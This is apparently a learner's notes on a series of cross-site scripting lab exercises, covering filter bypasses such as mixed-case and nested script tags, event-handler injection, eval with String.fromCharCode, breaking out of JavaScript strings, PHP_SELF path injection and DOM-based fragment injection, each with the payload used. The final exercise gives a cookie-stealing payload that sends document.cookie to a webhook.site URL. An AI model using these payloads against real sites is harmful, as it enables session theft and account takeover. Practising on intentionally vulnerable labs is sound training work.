

Cross Site Scripting
=====================

01:
	- This one was basic XSS with allowed script tags.
	- Make sure that you check the source code of the HTML page to see that the information you sent as part of the request is echoed back without any HTML encoding.

02:
	- <script> and </script> are filtered... We can try <sCrIpt> and </sCRIpt> instead. To bypass this filter.
	- You can use confirm instead of alert too

03:
	- This was a smart approach... Like a really good one. Suppose that a server, is stripping off the <script> tags... So we specify... <scr<script>ipt>. When it will strip the <script tag... The another one is gonna render on the server side. Bingo... Same is for </scr<script>>. 
		- Tbh, this a genuine mistake... Not a made one. Can be found in real world apps.

04:
	- In this example, the developer decided to completely block the word script: if the request matches script, the execution stops.

	- Fortunately (or unfortunately depending on what side you are on), there are a lot of ways to get JavaScript to be run (non-exhaustive list):

    	- with the <a tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick ...
    	- with the <a tag directly in the URL: <a href='javascript:alert(1)'... (you will need to click the link to trigger the JavaScript code and remember that this won't work since you cannot use script in this example).
    	- with the <img tag directly with the event onerror: <img src='zzzz' onerror='alert(1)' />.
    	- with the <div tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick...
    	- ...

You can use any of these techniques to get the alert box to pop-up.

	Note: Make sure that you don't rely on user triggering xss using user interaction events like onmouseover. They can work... But don't rely on them from start.

05:
	- In this example, the <script> tag is accepted and gets echoed back. But as soon as you try to inject a call to alert, the PHP script stops its execution. The problem seems to come from a filter on the word alert.

	- Using JavaScript's eval and String.fromCharCode(), you should be able to get an alert box without using the word alert directly. String.fromCharCode() will decode an integer (decimal value) to the corresponding character.

	- You can write a small tool to transform your payload to this format using your favorite scripting language.

	- Using this trick and the ascii table, you can easily generate the string: alert(1) and call eval on it.

	- Payload used: <script>eval(String.fromCharCode(97, 108, 101, 114, 116))('UUID');</script>

06:
	- Here, the source code of the HTML page is a bit different. If you read it, you will see that the value you are sending is echoed back inside JavaScript code. To get your alert box, you will not need to inject a script tag, you will just need to correctly complete the pre-existing JavaScript code and add your own payload, then you will need to get rid of the code after your injection point by commenting it out (using //) or by adding some dummy code (var $dummy = ") to close it correctly.

	- Payload used: ";alert('UUID');var $dummy="

07:
	- Nothing differnt. Just used single quotes? and a little to-know about html-entities
	- This example is similar to the one before. This time, you won't be able to use special characters, since they will be HTML-encoded. As you will see, you don't really need any of these characters.
	- This issue is common in PHP web applications, because the well-known function used to HTML-encode characters (htmlentities) does not encode single quotes ('), unless you told it to do so, using the ENT_QUOTES flag. 

	- Payload used: %27;alert(%27UUID%27);var%20b=%27

08:
	- Here, the value echoed back in the page is correctly encoded. However, there is still a XSS vulnerability in this page. To build the form, the developer used and trusted PHP_SELF which is the path provided by the user. It's possible to manipulate the path of the application in order to:
    	- call the current page (however you will get an HTTP 404 page);
    	- get a XSS payload in the page.
	- This can be done because the current configuration of the server will call /index.php when any URL matching /index.php/... is accessed. You can simply get your payload inside the page by accessing /index.php/[XSS_PAYLOAD]. Now that you know where to inject your payload, you will need to adapt it to get it to work and get the famous alert box.
	- Trusting the path provided by users is a common mistake, and it can often be used to trigger XSS, as well as other issues. This is pretty common in pages with forms, and in error pages (404 and 500 pages).

	- Hmm, alright let's try it.

	Payload used: /index.php/"><script>alert('uuid')</script>; //

09:

	- Payload used: #%3Cscript%3Ealert('1')%3C/script%3E

	- This example is a DOM-based XSS. This page could actually be completely static and still be vulnerable.

	- In this example, you will need to read the code of the page to understand what is happening. When the page is rendered, the JavaScript code uses the current URL to retrieve the anchor portion of the URL (#...) and dynamically (on the client side) write it inside the page. This can be used to trigger a XSS vulnerability, if you use the payload as part of the URL.

	- Since most browsers now encode the fragment, this vulnerable application decodes the fragment using the function decodeURIComponent(...). With old browsers, the exploitation works even if decodeURIComponent(...) is not present.

10:
	- This was a nice challenge...
	- Payload used: <script>document.write('<img src="http://webhook.site/83995da9-f618-42ba-9498-c6b8c701717e?c='%2bdocument.cookie%2b'" />');</script>


Abstract of 10
----------------

This exercise is identical to the first one. But this time, you're going to have to retrieve the victim's cookie. To do so, you can:

    Use your own server
    Use webhook.site

To get the cookie, you will use JavaScript. Your JavaScript code will retrieve the victim's cookies with document.cookie. Then you will add the value to a <img tag to send it to your website (or webhook.site).

Your payload should look like:

<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>

Once the browser renders the JavaScript the <img tag should look like:

<img src="[URL]?c=[COOKIE]"/>

And it will send the cookies to your website.

Make sure you don't forget to encode the + in the URL (%2b).


Summary
========

	- TODO the summary.